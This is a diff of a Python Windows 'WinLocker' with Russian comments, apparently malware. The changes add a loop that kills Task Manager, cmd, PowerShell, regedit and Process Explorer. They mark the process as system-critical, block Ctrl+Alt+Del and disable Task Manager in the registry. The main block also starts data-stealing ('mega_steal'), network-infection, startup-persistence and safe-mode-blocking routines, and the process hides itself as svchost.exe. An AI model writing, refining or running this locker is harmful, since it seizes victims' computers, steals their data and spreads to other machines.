@@ -1,6 +1,12 @@
+import subprocess, sys
+# АВТО-УСТАНОВКА БИБЛИОТЕК
+try:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+except: pass
+
 import os, sys, time, threading, tempfile, tkinter as tk
 from tkinter import PhotoImage
-import urllib.request, smtplib, socket, subprocess, base64, random, re, json
+import urllib.request, smtplib, socket, base64, random, re, json
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -25,7 +31,20 @@ LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
 LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
 attempts_left = MAX_ATTEMPTS
 
-# ===== ОТКЛЮЧЕНИЕ WIN =====
+def kill_taskmgr_super():
+    while True:
+        try:
+            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
+            os.system("taskkill /f /im cmd.exe >nul 2>&1")
+            os.system("taskkill /f /im powershell.exe >nul 2>&1")
+            os.system("taskkill /f /im msconfig.exe >nul 2>&1")
+            os.system("taskkill /f /im regedit.exe >nul 2>&1")
+            os.system("taskkill /f /im procexp.exe >nul 2>&1")
+            ctypes.windll.kernel32.SetProcessShutdownParameters(0x100, 0)
+            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+        except: pass
+        time.sleep(0.01)
+
 def disable_win_key():
     try:
         for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
@@ -41,13 +60,14 @@ def disable_win_key():
     try:
         import keyboard
         keyboard.block_key('windows'); keyboard.block_key('left windows'); keyboard.block_key('right windows')
-        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m','left windows','right windows','left windows+l','right windows+l']:
+        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','ctrl+shift+esc','ctrl+alt+del']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
     except: pass
 
 def enable_win_key():
     try:
+        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
         k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
@@ -88,12 +108,6 @@ def hide_process():
     try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
     except: pass
 
-def kill_taskmgr_loop():
-    while True:
-        for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]:
-            run_hidden(f"taskkill /f /im {p}")
-        time.sleep(0.05)
-
 def block_everything():
     try:
         import keyboard
@@ -103,12 +117,8 @@ def block_everything():
         for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
-        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
-        try:
-            k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
-        except: pass
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
     except: ctypes.windll.user32.BlockInput(True)
 
 def unblock_all():
@@ -198,8 +208,11 @@ def anim_connect():
     time.sleep(3); a.destroy()
 
 def play_video():
-    download_file(VIDEO_URL, VIDEO_PATH)
-    download_file(AUDIO_URL, AUDIO_PATH)
+    try:
+        download_file(VIDEO_URL, VIDEO_PATH)
+        download_file(AUDIO_URL, AUDIO_PATH)
+    except: return
+    
     time.sleep(0.3)
     try:
         v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
@@ -309,29 +322,31 @@ class WinLocker:
         self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
         global attempts_left
         
-        # ЛОГОТИП
-        download_file(LOGO_URL, LOGO_PATH)
         try:
-            logo = PhotoImage(file=LOGO_PATH)
-            logo = logo.subsample(4, 4)
-            lbl_logo = tk.Label(self.win, image=logo, bg='black')
-            lbl_logo.image = logo
-            lbl_logo.place(x=10, y=10)
+            download_file(LOGO_URL, LOGO_PATH)
+            if os.path.exists(LOGO_PATH):
+                logo = PhotoImage(file=LOGO_PATH)
+                logo = logo.subsample(4, 4)
+                lbl_logo = tk.Label(self.win, image=logo, bg='black')
+                lbl_logo.image = logo
+                lbl_logo.place(x=10, y=10)
         except: pass
         
-        # ТАЙМЕР
         self.timer_end = get_timer()
         self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
         self.update_timer()
         
-        # МУЗЫКА В ФОНЕ
-        download_file(LOCKER_MUSIC_URL, LOCKER_MUSIC_PATH)
+        # МУЗЫКА С АВТО-УСТАНОВКОЙ PYGAME
         try:
-            import pygame
-            pygame.mixer.init()
-            pygame.mixer.music.load(LOCKER_MUSIC_PATH)
-            pygame.mixer.music.play(-1)
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            download_file(LOCKER_MUSIC_URL, LOCKER_MUSIC_PATH)
+            if os.path.exists(LOCKER_MUSIC_PATH) and os.path.getsize(LOCKER_MUSIC_PATH) > 1000:
+                import pygame
+                pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
+                pygame.mixer.music.load(LOCKER_MUSIC_PATH)
+                pygame.mixer.music.set_volume(1.0)
+                pygame.mixer.music.play(-1)
         except: pass
         
         msg = f"""Привет друг!
@@ -399,10 +414,10 @@ YOU FUCK.
 if __name__ == "__main__":
     disable_win_key()
     hide_process()
+    threading.Thread(target=kill_taskmgr_super, daemon=True).start()
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
     block_safe_mode()
-    threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
     threading.Thread(target=infect_network, daemon=True).start()
     threading.Thread(target=timer_check_loop, daemon=True).start()
     
